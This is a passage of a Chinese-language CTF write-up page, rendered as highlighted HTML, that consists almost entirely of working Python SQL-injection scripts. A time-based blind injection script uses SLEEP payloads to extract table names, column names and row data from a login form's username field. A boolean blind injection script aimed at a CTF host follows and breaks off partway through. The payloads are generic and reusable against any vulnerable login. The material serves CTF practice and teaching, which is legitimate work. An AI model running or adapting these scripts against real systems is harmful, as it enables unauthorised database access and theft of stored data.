operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># ASCII 起始值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span>  <span class=\"token comment\"># ASCII 结束值</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token comment\"># 构造时间盲注 payload</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"' OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1), </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>char_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 1)) > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, SLEEP(3), 0) -- \"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'random_password'</span>  <span class=\"token comment\"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                start_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                end_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                elapsed_time <span class=\"token operator\">=</span> end_time <span class=\"token operator\">-</span> start_time</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">if</span> elapsed_time <span class=\"token operator\">>=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                    tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">if</span> head <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测到 ASCII 0 时结束当前表名</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            current_table <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            char_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_table<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 无更多表时退出循环</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        result <span class=\"token operator\">+=</span> current_table <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\"</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        table_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># 提取列名</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extract_column_name</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    column_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 列的索引，从 0 开始</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        char_index <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        current_column <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            head <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># ASCII 起始值</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span>  <span class=\"token comment\"># ASCII 结束值</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token comment\"># 构造时间盲注 payload</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                    <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"' OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">' LIMIT </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>column_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1), </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>char_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 1)) > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, SLEEP(3), 0) -- \"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'random_password'</span>  <span class=\"token comment\"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                start_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                end_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                elapsed_time <span class=\"token operator\">=</span> end_time <span class=\"token operator\">-</span> start_time</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>                <span class=\"token keyword\">if</span> elapsed_time <span class=\"token operator\">>=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                    head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                    tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>            <span class=\"token keyword\">if</span> head <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测到 ASCII 0 时结束当前列名</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            current_column <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>            char_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_column<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 无更多列时退出循环</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        result <span class=\"token operator\">+=</span> current_column <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\"</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        column_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token comment\"># 提取数据</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extract_data</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">,</span> column_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    data_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 数据的索引，从 0 开始</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        char_index <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        current_data <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            head <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># ASCII 起始值</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span>  <span class=\"token comment\"># ASCII 结束值</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>                mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>                <span class=\"token comment\"># 构造时间盲注 payload</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>                payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>                    <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"' OR IF(ASCII(SUBSTRING((SELECT </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>column_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> FROM </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> LIMIT </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>data_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1), </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>char_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 1)) > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, SLEEP(3), 0) -- \"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'random_password'</span>  <span class=\"token comment\"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>                start_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>                r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>                end_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>                elapsed_time <span class=\"token operator\">=</span> end_time <span class=\"token operator\">-</span> start_time</pre></td></tr><tr><td data-num=\"105\"></td><td><pre>                <span class=\"token keyword\">if</span> elapsed_time <span class=\"token operator\">>=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>                    head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>                    tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token keyword\">if</span> head <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测到 ASCII 0 时结束当前数据</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>            current_data <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>            char_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_data<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 无更多数据时退出循环</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>        result <span class=\"token operator\">+=</span> current_data <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\"</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        data_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token comment\"># 主函数</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    <span class=\"token comment\"># 提取表名</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"提取表名中...\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    tables <span class=\"token operator\">=</span> extract_table_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"获取到的表名：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tables<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token comment\"># 提取列名</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    table_name <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要提取列名的表名：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"提取表 </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> 的列名中...\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    columns <span class=\"token operator\">=</span> extract_column_name<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"获取到的列名：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>columns<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token comment\"># 提取数据</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    column_name <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要提取数据的列名：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"提取表 </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> 中列 </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>column_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> 的数据中...\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    data <span class=\"token operator\">=</span> extract_data<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">,</span> column_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"获取到的数据：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"布尔盲注\"><a class=\"anchor\" href=\"#布尔盲注\">#</a> 布尔盲注</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 目标 URL</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://challenge.ctf.rois.team:30181/'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 提取表名</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extract_table_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    table_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 表的索引，从 0 开始</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        char_index <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        current_table <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            head <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># ASCII 起始值</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span>  <span class=\"token comment\"># ASCII 结束值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token comment\"># 构造注入 payload</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"' OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1), </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>char_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 1)) > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 0, 1) -- \"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'random_password'</span>  <span class=\"token comment\"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token string\">\"用户名或密码错误\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                    head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">if</span> head <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测到 ASCII 0 时结束当前表名</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            current_table <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            char_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_table<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 无更多表时退出循环</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        result <span class=\"token operator\">+=</span> current_table <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\"</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        table_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\"># 提取列名</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extract_column_name</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    column_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 列的索引，从 0 开始</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        char_index <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        current_column <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  